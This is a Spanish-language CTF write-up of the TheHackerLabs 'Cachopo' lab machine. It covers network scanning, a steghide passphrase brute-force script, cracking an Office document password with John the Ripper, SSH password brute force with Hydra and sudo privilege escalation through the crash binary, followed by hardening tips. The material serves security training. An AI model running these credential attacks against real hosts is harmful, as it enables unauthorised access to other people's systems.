---
title: "TheHackerLabs - Avanzado : [Cachopo]"
date: 2024-08-12 13:35:00 +0200
categories: [CTF, Writeups, TheHackerLabs, Linux, Avanzado]
description: "Explora el desaf√≠o CTF 'Cachopo', dise√±ado para usuarios avanzados en un entorno Linux."
tags: [CTF, Writeups, TheHackerLabs, Linux, Avanzado]
image: /img/posts/CTF/cachopo/cachopo.png
---

## Introducci√≥nn

Bienvenidos al desaf√≠o **"Cachopo"**, un CTF dise√±ado para usuarios avanzados que se lleva a cabo en un sistema operativo basado en Linux. Este reto, creado por ``@condor & @CuriosidadesDeHackers``, ofrece una excelente oportunidad para que los usuarios con experiencia se enfrenten a tareas complejas y afiancen sus habilidades en un entorno CTF. En este desaf√≠o, se requerir√° un dominio s√≥lido de las operaciones de Linux, as√≠ como conocimientos avanzados en t√©cnicas de hacking y seguridad inform√°tica.


üåê [**Web oficial del CTF: TheHackersLabs - Cachopo**](https://thehackerslabs.com/cachopo/){:target="_blank"}

## Identificaci√≥n de la V√≠ctima con Arp-Scan

Iniciamos el reto utilizando `arp-scan` para identificar la direcci√≥n IP de la v√≠ctima dentro de nuestra red local. Este es un paso crucial para asegurar que los siguientes ataques sean dirigidos correctamente.

Para m√°s detalles sobre c√≥mo realizar este paso, he escrito un post detallado que puedes encontrar aqu√≠:

üåê [**Consiguiendo la IP de la V√≠ctima en CTFs**](/posts/consiguiendo-la-ip-victima-CTF/){:target="_blank"}

### Ejecuci√≥n de Arp-Scan

Desde nuestra terminal, lanzamos el siguiente comando:

```bash
‚îå‚îÄ[root@parrot]‚îÄ[/home/oscar]
‚îî‚îÄ‚îÄ‚ïº  #arp-scan -I ens36 --localnet
Interface: ens36, type: EN10MB, MAC: 00:0c:29:27:66:15, IPv4: 172.18.0.133
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.18.0.1	00:50:56:c0:00:08	VMware, Inc.
172.18.0.2	00:50:56:f0:e7:9f	VMware, Inc.
172.18.0.134	00:0c:29:f3:5c:ae	VMware, Inc.
172.18.0.254	00:50:56:f8:f4:23	VMware, Inc.
```


## Primer Escaneo con Nmap

Una vez identificada la direcci√≥n IP ( **172.18.0.134** ) de la v√≠ctima, procedemos con un escaneo exhaustivo de todos los puertos utilizando `nmap`.


### Explicaci√≥n de los Par√°metros Utilizados

- **-p-**: Este par√°metro indica que se deben escanear todos los puertos (del 1 al 65535).
- **-vvv**: Aumenta el nivel de verbosidad, proporcionando m√°s detalles sobre el proceso del escaneo.
- **-n**: No resuelve nombres DNS, lo que acelera el escaneo al evitar consultas DNS.
- **-sS**: Realiza un escaneo SYN (semiabierto), que es m√°s r√°pido y sigiloso que un escaneo completo.
- **-Pn**: Omite el descubrimiento de hosts (no ping), asumiendo que el host est√° activo.
- **--min-rate 2000**: Establece la tasa m√≠nima de paquetes enviados por segundo a 2000.
- **172.18.0.134**: Especifica la direcci√≥n IP del objetivo.
- **-oN allports**: Guarda los resultados en un archivo en formato normal (legible para humanos).

### Raz√≥n para Usar `--min-rate 2000` en Lugar de `5000`

El par√°metro `--min-rate` controla la velocidad a la que `nmap` env√≠a los paquetes durante el escaneo. Establecer una tasa de 2000 paquetes por segundo es un equilibrio entre velocidad y fiabilidad. Usar una tasa m√°s alta, como 5000 paquetes por segundo, podr√≠a llevar a:

- **P√©rdida de Paquetes**: Las redes y dispositivos podr√≠an descartar paquetes debido a la alta carga, resultando en resultados menos fiables.
- **Detecci√≥n y Bloqueo**: Los sistemas de detecci√≥n de intrusiones (IDS) y cortafuegos podr√≠an identificar y bloquear el escaneo debido a la alta tasa de tr√°fico, dificultando el escaneo exitoso.
- **Saturaci√≥n de la Red**: En redes m√°s lentas o congestionadas, una tasa alta podr√≠a saturar la red, afectando otros servicios y dispositivos.

Por estas razones, utilizamos una tasa de 2000 paquetes por segundo, lo cual proporciona un buen balance entre velocidad y precisi√≥n, reduciendo el riesgo de que los paquetes sean descartados o detectados como actividad maliciosa.


```bash
nmap -p- --min-rate 2000 -sS -vvv -Pn -oN allports 172.18.0.134
Nmap scan report for 172.18.0.134
Host is up, received arp-response (0.00062s latency).
Scanned at 2024-08-11 12:09:28 CEST for 15s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:F3:5C:AE (VMware)
```

## Escaneo Detallado de Puertos Espec√≠ficos

Tras identificar los puertos abiertos en el primer escaneo, realizamos un escaneo m√°s detallado en los puertos que parec√≠an m√°s interesantes.

### Explicaci√≥n de los Par√°metros Utilizados

- **-sCV**: Realiza un escaneo de detecci√≥n de versiones y scripts (equivalente a `-sC` para ejecutar scripts de detecci√≥n y `-sV` para detectar versiones de servicios).
- **-p22,80**: Especifica los puertos a escanear, en este caso, el 22 (SSH) y el 80 (HTTP).
- **172.18.0.134**: Especifica la direcci√≥n IP del objetivo.
- **-oN ports**: Guarda los resultados en un archivo en formato normal (legible para humanos).

Este escaneo nos permitir√° obtener m√°s informaci√≥n sobre los servicios que est√°n corriendo en estos puertos, incluyendo sus versiones y posibles vulnerabilidades asociadas. Realizamos el escaneo detallado utilizando el siguiente comando:

```bash
nmap -sSCV -p 22,80 -oN ports 172.18.0.134
Nmap scan report for 172.18.0.134
Host is up (0.00059s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 b4:ae:d2:8b:a8:30:a5:fb:58:a9:b2:38:73:33:1d:e0 (ECDSA)
|_  256 76:21:61:f1:f5:67:8a:95:dc:c1:73:56:16:2e:a4:a5 (ED25519)
80/tcp open  http    Apache httpd 2.4.61
|_http-title: Did not follow redirect to http://cachopo.thl/
|_http-server-header: Apache/2.4.61 (Debian)
MAC Address: 00:0C:29:F3:5C:AE (VMware)
Service Info: Host: cachopo.thl; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# An√°lisis del Escaneo de Nmap

En el escaneo de Nmap, nos encontramos con el siguiente resultado:

*http-title: Did not follow redirect to http://cachopo.thl/*


Esto significa que Nmap detect√≥ que la p√°gina web est√° configurada para redirigir a una URL diferente, en este caso `http://cachopo.thl/`. Sin embargo, Nmap no sigui√≥ esta redirecci√≥n, por lo que el an√°lisis solo muestra el t√≠tulo de la p√°gina original y no el contenido de la p√°gina a la que redirige.

Para resolver esto, tendremos que a√±adir el nombre de dominio `cachopo.thl` y su IP en el archivo `/etc/hosts` de nuestro sistema. Esto le indicar√° a nuestra m√°quina que el nombre de dominio `cachopo.thl` corresponde a una IP espec√≠fica, permitiendo as√≠ que las redirecciones y otras solicitudes relacionadas funcionen correctamente en nuestras pruebas o an√°lisis.

## Pasos para a√±adir una entrada en /etc/hosts

- A√±adimos una linea al final del archivo `/etc/hosts` con privilegios de superusuario, con la IP y la URL:

```bash
‚îå‚îÄ[root@parrot]‚îÄ[/home/oscar]
‚îî‚îÄ‚îÄ‚ïº echo "172.18.0.134 cachopo.thl" | tee -a /etc/hosts
 ```

- Revisamos la ultima linea del fichero hosts, y si, la ha a√±adido.

```bash
‚îå‚îÄ[root@parrot]‚îÄ[/home/oscar]
‚îî‚îÄ‚îÄ‚ïº #tail -n 1 /etc/hosts
172.18.0.134 cachopo.thl
```


Esto deber√≠a ayudarnos a asegurar que las redirecciones y otros aspectos relacionados con `cachopo.thl` se manejen correctamente en nuestro entorno.


# An√°lisis del Servidor Web y Uso de Steghide

Tras analizar el servidor web, no encontramos subdominios, directorios o ficheros que parezcan vulnerables. El c√≥digo fuente del sitio solo muestra una imagen de fondo. Vamos a analizar la imagen con la herramienta **Steghide** para comprobar si hay datos ocultos en ella.

![web](/img/posts/CTF/cachopo/web.png)
![source](/img/posts/CTF/cachopo/codigo.png)

## Comando para Extraer Datos con Steghide

Ejecutamos el siguiente comando para intentar extraer datos ocultos de la imagen:

```bash
steghide --extract -sf /home/oscar/Descargas/cachopo.jpg
```

Al ejecutar el comando, obtenemos el siguiente resultado:


```bash
Anotar salvoconducto:
steghide: No pude extraer ning√∫n dato con ese salvoconducto!
```


# Descubrimiento de Contrase√±a con Rockyou

Necesitamos encontrar una contrase√±a para extraer datos de la imagen. Utilizaremos la lista de contrase√±as **rockyou.txt** en un bucle para intentar cada contrase√±a hasta encontrar la correcta.

A continuaci√≥n, preparamos el script y las rutas necesarias.

## Rutas y Script

Las rutas actuales y el script son los siguientes:

```bash
‚îå‚îÄ[root@parrot]‚îÄ[/home/oscar/Scripts]
‚îî‚îÄ‚îÄ‚ïº #l
cachopo.sh
‚îå‚îÄ[root@parrot]‚îÄ[/home/oscar/Scripts]
‚îî‚îÄ‚îÄ‚ïº #l /home/oscar/Descargas/
cachopo.jpg
‚îî‚îÄ‚îÄ‚ïº #
```

## Script `cachopo.sh`

Aqu√≠ est√° el script para realizar el ataque de fuerza bruta utilizando la lista de contrase√±as `rockyou.txt`:

```bash
#!/bin/bash
rockyou="/usr/share/wordlists/rockyou.txt"
jpgfile="/home/oscar/Descargas/cachopo.jpg"
output=""
while IFS= read -r password; do
    output=$(steghide --extract -sf "$jpgfile" -p "$password" 2>&1)
    if [[ $output == *"salvoconducto"* ]]; then
        echo -ne "Probando la contrase√±a: $password\r"
    else
        echo -e "\n------------------------------------"
        echo -e "\nContrase√±a encontrada: $password"
        break
    fi
done < "$rockyou"
```

## Ejecuci√≥n del Script

Damos permisos de ejecuci√≥n al script y lo ejecutamos:

```bash
‚îå‚îÄ[‚úó]‚îÄ[root@parrot]‚îÄ[/home/oscar/Scripts]
‚îî‚îÄ‚îÄ‚ïº #chmod +x cachopo.sh
‚îå‚îÄ[root@parrot]‚îÄ[/home/oscar/Scripts]
‚îî‚îÄ‚îÄ‚ïº #./cachopo.sh
Probando la contrase√±a: elisazrch
----------------------------------

*Contrase√±a encontrada: doggies*
```

El script ha encontrado la contrase√±a correcta: `doggies`. Ahora podemos usar esta contrase√±a para extraer los datos de la imagen si es necesario.

# Extracci√≥n de Datos y An√°lisis de Ficheros

Tras ejecutar el comando **Steghide** para extraer los datos ocultos de la imagen, encontramos un fichero llamado `directorio.txt` con el siguiente contenido:

```bash
‚îå‚îÄ[‚úó]‚îÄ[root@parrot]‚îÄ[/home/oscar/Scripts]
‚îî‚îÄ‚îÄ‚ïº #steghide --extract -sf /home/oscar/Descargas/cachopo.jpg
Anotar salvoconducto: 
anot√≥ los datos extra√≠dos e/"directorio.txt".
‚îî‚îÄ‚îÄ‚ïº #l
cachopot.sh*  directorio.txt
‚îî‚îÄ‚îÄ‚ïº #cat directorio.txt 
el directorio es mycachopo
```

## Acceso al Directorio

Al acceder a la URL `cachopo.thl/mycachopo`, observamos que contiene un fichero llamado `Cocineros`. Lo descargamos y, al no tener una extensi√≥n, revisamos la informaci√≥n del fichero con el siguiente comando:


```bash
‚îå‚îÄ[‚úó]‚îÄ[root@parrot]‚îÄ[/home/oscar/Descargas]
‚îî‚îÄ‚îÄ‚ïº #file Cocineros 
Cocineros: CDFV2 Encrypt
```

![mycachopo](/img/posts/CTF/cachopo/mycachopo.png)

## Explicaci√≥n del Comando `file`

El comando **`file`** se utiliza en sistemas Unix para determinar el tipo de un fichero. Analiza el contenido del fichero y proporciona una descripci√≥n del tipo de datos que contiene. En este caso, el comando `file` nos informa que el fichero `Cocineros` es de tipo `CDFV2 Encrypt`.

### ¬øQu√© es `CDFV2 Encrypt`?

**CDFV2 (Compound Document File Format Version 2)** es un formato de archivo utilizado por Microsoft para documentos complejos que pueden contener m√∫ltiples tipos de datos y metadatos. **CDFV2 Encrypt** indica que el fichero est√° en formato CDF versi√≥n 2 y est√° cifrado. Esto significa que los datos en el fichero est√°n protegidos mediante cifrado, y se necesita una clave o herramienta especial para descifrarlos y acceder a su contenido.

Para proceder, necesitaremos encontrar una forma de descifrar el fichero CDFV2 si es que contiene informaci√≥n valiosa. Esto podr√≠a implicar el uso de herramientas espec√≠ficas de descifrado o la b√∫squeda de una clave de descifrado adecuada.

# Desciframiento del Documento Cifrado

Para descifrar el fichero `Cocineros`, utilizamos una herramienta llamada **`office2john`** y **`john the ripper`**.

## Herramienta `office2john`

**`office2john`** es una herramienta incluida en el paquete de **John the Ripper** que se utiliza para extraer hashes de contrase√±as de documentos de Microsoft Office cifrados. La herramienta convierte el documento cifrado en un formato que **John the Ripper** puede usar para realizar ataques de fuerza bruta.

### Comando para Extraer Hash

Ejecutamos **`office2john`** para extraer el hash de la contrase√±a del fichero `Cocineros` y lo guardamos en un archivo llamado `hash`:

```bash
‚îå‚îÄ[root@parrot]‚îÄ[/home/oscar/Descargas]
‚îî‚îÄ‚îÄ‚ïº #office2john Cocineros > hash
```

## Desciframiento con `john the ripper`

Una vez que tenemos el hash, utilizamos **`john the ripper`** para realizar un ataque de fuerza bruta con la lista de contrase√±as `rockyou.txt`:

```bash
‚îå‚îÄ[root@parrot]‚îÄ[/home/oscar/Descargas]
‚îî‚îÄ‚îÄ‚ïº #john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2007 for all loaded hashes
Cost 2 (iteration count) is 50000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
horse1           (Cocineros)     
1g 0:00:00:07 DONE (2024-08-11 18:58) 0.1422g/s 669.1p/s 669.1c/s 669.1C/s bobcat..alemania
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

John ha descifrado la contrase√±a del documento, que es `horse1`.

## Apertura del Documento

Con la contrase√±a obtenida, abrimos el documento `Cocineros` utilizando **LibreOffice** para revisar su contenido:

```bash
‚îå‚îÄ[root@parrot]‚îÄ[/home/oscar/Descargas]
‚îî‚îÄ‚îÄ‚ïº #libreoffice Cocineros
```
![passw](/img/posts/CTF/cachopo/passw.png)
![cocineros](/img/posts/CTF/cachopo/cocineros.png)


# Reflexiones y Progreso en el CTF

**Hacemos una pausa y explicamos:**

En sistemas Unix, no existe una norma estricta que obligue a que los nombres de usuario comiencen con min√∫sculas, pero es conveniente seguir esta convenci√≥n por razones de consistencia y facilidad de administraci√≥n. Aunque no siempre es necesario, ayuda a evitar posibles confusiones.

Despu√©s de pasar casi toda la noche y la ma√±ana trabajando en el escaneo de usuarios, decidimos utilizar **Hydra** con la lista de usuarios comunes para realizar un ataque de fuerza bruta (Primera letra en minuscula)

## Intento Inicial con Hydra

Creamos un archivo llamado `usuarios` con los nombres de usuario que quer√≠amos probar:

```bash
‚îå‚îÄ[oscar@parrot]‚îÄ[~/Descargas]
‚îî‚îÄ‚îÄ‚ïº $cat usuarios
sofia
carlos
luis
```

Observamos que Hydra estaba tardando mucho en procesar. Para investigar, decid√≠ ejecutar Hydra en modo debug usando la opci√≥n `-d`. A continuaci√≥n, se muestra un extracto del debug donde se puede ver que Hydra est√° probando todas las contrase√±as para el primer usuario `sofia`:

```bash
[DEBUG] we will redo the following combination: target 172.18.0.134  child 0  login "sofia"  pass "password1"
[DEBUG] we will redo the following combination: target 172.18.0.134  child 1  login "sofia"  pass "soccer"
[DEBUG] we will redo the following combination: target 172.18.0.134  child 2  login "sofia"  pass "butterfly"
[DEBUG] we will redo the following combination: target 172.18.0.134  child 3  login "sofia"  pass "anthony"
...
```

Hydra intentar√° todas las contrase√±as indicadas en el par√°metro `-p` o `-P` para el usuario especificado. Dado que estamos usando la lista `rockyou`, Hydra no pasar√° al siguiente usuario hasta que haya terminado de probar todas las contrase√±as para el usuario actual.

### Alternativas y Soluci√≥n

Consider√© lanzar una instancia separada de Hydra para cada usuario: `sofia`, `carlos` y `luis`. Esto result√≥ en encontrar el login exitosamente:

```bash
‚îå‚îÄ[‚úó]‚îÄ[root@parrot]‚îÄ[/home/oscar/Descargas]
‚îî‚îÄ‚îÄ‚ïº #hydra -l carlos -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.134   
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-11 20:11:50
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.18.0.134:22/
[STATUS] 114.00 tries/min, 114 tries in 00:01h, 14344287 to do in 2097:08h, 14 active
[STATUS] 98.67 tries/min, 296 tries in 00:03h, 14344105 to do in 2422:60h, 14 active
[22][ssh] host: 172.18.0.134   login: carlos   password: bowwow
```

Descubrimos que **Hydra** tambi√©n tiene la opci√≥n `-u`, que permite recorrer los usuarios en lugar de las contrase√±as. Esto puede ser m√°s eficiente en escenarios donde se espera que la misma contrase√±a pueda ser v√°lida para varios usuarios.

## Uso de la Opci√≥n `-u`

La opci√≥n `-u` en Hydra significa "*loop around users, not passwords*" (recorrer usuarios en lugar de contrase√±as). Esta opci√≥n cambia el orden en el que Hydra prueba las combinaciones:

- **Sin `-u`:** Hydra prueba todas las contrase√±as para un usuario antes de pasar al siguiente usuario.
- **Con `-u`:** Hydra prueba todas las contrase√±as para cada usuario antes de pasar a la siguiente contrase√±a.

Ejemplo:
**Sin -u:**

```python

        usuario1 -> contrase√±a1
        usuario1 -> contrase√±a2
        usuario1 -> contrase√±a3
        usuario1 -> contrase√±a4
        ...
        usuario2 -> contrase√±a1
        usuario2 -> contrase√±a2
        usuario2 -> contrase√±a3
        usuario2 -> contrase√±a4
        ...
```

**Con -u:**
```python
        usuario1 -> contrase√±a1
        usuario2 -> contrase√±a1
        usuario3 -> contrase√±a1
        usuario4 -> contrase√±a1
        ...
        usuario1 -> contrase√±a2
        usuario2 -> contrase√±a2
        usuario3 -> contrase√±a2
        usuario4 -> contrase√±a2
        ...
```
Esto es √∫til cuando se sospecha que una contrase√±a com√∫n puede ser utilizada por varios usuarios.

### Ejemplo Pr√°ctico

Ejecutamos Hydra con la opci√≥n `-u` y en modo verbose `-v -V` para obtener una salida m√°s detallada:

```bash
‚îå‚îÄ[‚úó]‚îÄ[root@parrot]‚îÄ[/home/oscar/Descargas/script]
‚îî‚îÄ‚îÄ‚ïº #hydra -v -V -u -L usuarios.txt -P /usr/share/wordlists/rockyou.txt 172.18.0.134 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-11 22:50:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 43033197 login tries (l:3/p:14344399), ~2689575 tries per task
[DATA] attacking ssh://172.18.0.134:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://sofia@172.18.0.134:22
[INFO] Successful, password authentication is supported by ssh://172.18.0.134:22
[ATTEMPT] target 172.18.0.134 - login "sofia" - pass "123456" - 1 of 43033197 [child 0] (0/0)
[ATTEMPT] target 172.18.0.134 - login "carlos" - pass "123456" - 2 of 43033197 [child 1] (0/0)
...
[ATTEMPT] target 172.18.0.134 - login "luis" - pass "rockyou" - 22 of 43033198 [child 15] (0/1)
[ATTEMPT] target 172.18.0.134 - login "sofia" - pass "12345678" - 23 of 43033198 [child 5] (0/1)
...
```

La ejecuci√≥n en modo verbose mostr√≥ que Hydra estaba probando cada combinaci√≥n de usuario y contrase√±a como se esperaba. Finalmente, ejecutamos Hydra sin verbose para mejorar la eficiencia.

```bash
‚îå‚îÄ[root@parrot]‚îÄ[/home/oscar/Descargas/script]
‚îî‚îÄ‚îÄ‚ïº #hydra -u -L usuarios.txt -P /usr/share/wordlists/rockyou.txt 172.18.0.134 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-11 22:50:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 43033197 login tries (l:3/p:14344399), ~2689575 tries per task
[DATA] attacking ssh://172.18.0.134:22/
[STATUS] 299.00 tries/min, 299 tries in 00:01h, 43032899 to do in 2398:43h, 15 active
[22][ssh] host: 172.18.0.134   login: carlos   password: bowwow
```

Finalmente, obtuvimos la contrase√±a utilizando un archivo con varios usuarios y otro con contrase√±as. Este proceso subraya la importancia de revisar la documentaci√≥n y las ayudas oficiales de la herramienta que estamos utilizando.

**Fin de la pausa, seguimos**


# Conexi√≥n SSH y Escalaci√≥n de Privilegios

Nos conectamos al servidor usando SSH con el usuario `carlos`:

```bash
‚îî‚îÄ‚îÄ‚ïº #ssh carlos@172.18.0.134
The authenticity of host '172.18.0.134 (172.18.0.134)' can't be established.
ED25519 key fingerprint is SHA256:TwxUt/2Cw+RBXmkw35lCwjyjcXY9BpomAJBscsWYUC4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.18.0.134' (ED25519) to the list of known hosts.
carlos@172.18.0.134's password: 
Linux Cachopo 6.1.0-22-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.94-1 (2024-06-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 11 21:29:23 2024 from 172.18.0.133
carlos@Cachopo:~$ 
```

Estamos dentro del sistema como el usuario `carlos`. A continuaci√≥n, comenzamos a investigar los privilegios disponibles con el comando `sudo -l`:

```bash
carlos@Cachopo:~$ sudo -l
Matching Defaults entries for carlos on Cachopo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User carlos may run the following commands on Cachopo:
    (ALL) NOPASSWD: /usr/bin/crash
carlos@Cachopo:~$ 
```

El resultado indica que el usuario `carlos` puede ejecutar el comando `/usr/bin/crash` con privilegios de superusuario (`sudo`) sin necesidad de proporcionar una contrase√±a.

## Escalaci√≥n de Privilegios con el Binario `crash`

El binario `crash` est√° disponible para ejecuci√≥n sin contrase√±a, lo que significa que podemos usarlo para intentar escalar nuestros privilegios. El binario `crash` es una herramienta de depuraci√≥n para el n√∫cleo de Linux, y en algunos casos, puede ser utilizado para obtener acceso root dependiendo de su configuraci√≥n y el entorno del sistema.

En https://gtfobins.github.io/gtfobins/crash/ tenemos la explicaci√≥n de como explotar la vulnerabilidad.

![vuln](/img/posts/CTF/cachopo/sh.png)
![root](/img/posts/CTF/cachopo/root.png)


# Medidas de Seguridad para Prevenir Vulnerabilidades

## 1. Revisar y Corregir Configuraciones de Servicios

- **Configurar Servicios de Forma Segura:** Revisa la configuraci√≥n de servicios activos. Por ejemplo, en un servidor web, configura adecuadamente los archivos `.htaccess` para restringir el acceso.

## 2. Aplicar Actualizaciones y Parches
- **Actualizar el Sistema Regularmente:** Mant√©n el sistema operativo y todas las aplicaciones actualizadas.
```bash
  sudo apt-get update
  sudo apt-get upgrade
```

- **Aplicar Parches de Seguridad:** Instala parches y actualizaciones de seguridad proporcionados por los proveedores de software.

## 3. Implementar Control de Acceso Adecuado
- **Configurar Permisos de Archivos:** Aseg√∫rate de que los archivos y directorios tengan los permisos m√≠nimos necesarios.
```bash
  chmod 600 archivo.txt
```

- **Revisar Configuraci√≥n de Usuario y Grupos:** Verifica que los usuarios y grupos tengan los permisos adecuados y revisa las pol√≠ticas de acceso.

## 4. Monitorizaci√≥n y Auditor√≠a
- **Habilitar Registros de Actividad:** Configura el sistema para registrar eventos importantes y monitorear accesos.
 ```bash
  sudo apt-get install auditd
  sudo systemctl start auditd
```

- **Revisar Registros Regularmente:** Revisa los registros de actividad para detectar posibles intentos de acceso no autorizado o comportamientos sospechosos.

## 5. Utilizar Medidas de Seguridad Adicionales
- **Implementar Cortafuegos:** Configura un firewall para controlar el tr√°fico entrante y saliente.
```bash
  sudo ufw enable
  sudo ufw allow ssh
```

- **Aplicar Seguridad a Nivel de Aplicaci√≥n:** Aseg√∫rate de que las aplicaciones web est√©n protegidas contra ataques comunes como SQL Injection y XSS.



Gracias por leer hasta aqu√≠. Un saludo, √ìscar